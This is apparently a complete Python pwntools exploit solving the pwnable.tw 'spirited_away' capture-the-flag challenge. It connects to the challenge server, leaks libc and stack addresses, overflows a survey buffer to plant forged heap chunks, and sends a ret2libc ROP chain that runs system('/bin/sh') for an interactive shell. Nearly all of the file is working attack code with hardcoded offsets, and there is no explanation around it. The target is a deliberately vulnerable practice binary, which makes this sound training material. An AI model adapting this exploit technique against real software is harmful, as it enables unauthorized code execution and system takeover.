#!/usr/bin/env python2
from pwn import *
context(arch = 'i386', os = 'linux')

ready = True
if ready:
    conn = remote('chall.pwnable.tw', 10204)
else:
    conn = process(['/home/doublesine/Desktop/spirited_away'], env = {'LD_LIBRARY_PATH' : '/home/doublesine/Desktop/'})

def Sendraw(s):
    conn.send_raw(s)
    print(s)

def Sendline(s):
    conn.sendline(s)
    print(s)

def Padding(s, require_len, pad_ch):
    return s + (require_len - len(s)) * pad_ch

# leak libc base address
sleep(0.5)
print conn.read(),
Sendraw('fuck')
print conn.read(),
Sendline('1')
print conn.read(),
Sendraw('fuck' * 6)
print conn.read(),
Sendraw('fuck')
print conn.readuntil('fuck' * 6),
recv = conn.read(4)
print recv.__repr__(), conn.read(),
libc_IO_file_sync0_offset_7 = unpack(recv, 32)
libc_IO_file_sync0 = libc_IO_file_sync0_offset_7 - 7
libc_base_addr = libc_IO_file_sync0 - 0x000675E0
libc_system = libc_base_addr + 0x0003A940
libc_bin_sh_addr = libc_base_addr + 0x00158e8b
print '[*] libc_base_addr = 0x%08x' % libc_base_addr

# leak stack address
Sendline('y')
print conn.read(),
Sendraw('fuck')
print conn.read(),
Sendline('1')
print conn.read(),
Sendraw('A' * 80)
print conn.read(),
Sendraw('fuck')
print conn.readuntil('A' * 80),
recv = conn.read(8)
print recv.__repr__(), conn.read(),
main_ebp = unpack(recv[0:4], 32)
survey_ebp = main_ebp - 0x20
survey_esp = survey_ebp - 0xf8
survey_return_addr = unpack(recv[4:8], 32)
survey_reason_buf_addr = survey_ebp - 0x50
assert(survey_return_addr == 0x8048908)
print '[*] main_ebp = 0x%08x' % main_ebp
print '[*] survey_ebp = 0x%08x' % survey_ebp
print '[*] survey_esp = 0x%08x' % survey_esp
print '[*] survey_return_addr = 0x%08x' % survey_return_addr

# overflow
cnt = 2
while cnt < 100:
    if len(str(cnt)) == 1:
        Sendline('y')
        print conn.read(),
        Sendraw('fuck')     # name
        print conn.read(),
        Sendline('1')       # age
        print conn.read(),
        Sendraw('fuck')     # reason
        print conn.read(),
        Sendraw('fuck')     # comment
        print conn.read(),
    else:
        Sendline('y')
        print conn.read(),
        Sendline('1')       # age
        print conn.read(),
        Sendraw('fuck')     # reason
        print conn.read(),
    cnt += 1
    print '[*] cnt = %d' % cnt

# build fake chunks
'''
00 00 00 00 ----- prev size (first chunk)
41 00 00 00 ----- size      (first chunk)
41 (*56)    ----- data      (first chunk)
00 00 00 00 ----- prev size (second chunk)
11 00 00 00 ----- size      (second chunk)
'''
fake_chunk = pack(0, 32) + \
             pack(0x41, 32) + \
             'A' * 56 + \
             pack(0, 32) + \
             pack(0x11, 32)

# send fake chunks
Sendline('y')
print conn.read(),
Sendraw('fuck')     # name
print conn.read(),
Sendline('1')       # age
print conn.read(),
Sendraw(fake_chunk)     # reason
print conn.read(),
exp_buf = 'A' * 80 + 'fuck' + pack(survey_reason_buf_addr + 8, 32)
exp_buf += fake_chunk[0:ord('n') - len(exp_buf)]
Sendraw(exp_buf)    # comment
print conn.read(),

# build ROP chain
ROPchain = pack(libc_system, 32) + pack(survey_return_addr, 32) + pack(libc_bin_sh_addr, 32)
Sendline('y')
print conn.read(),
Sendraw('A' * (80 - 8) + 'fuck' + ROPchain)     # name
print conn.read(),
Sendline('1')       # age
print conn.read(),
Sendraw('fuck')     # reason
print conn.read(),
Sendraw('fuck')     # comment
print conn.read(),

# exit to trigger
Sendline('n')
conn.interactive()
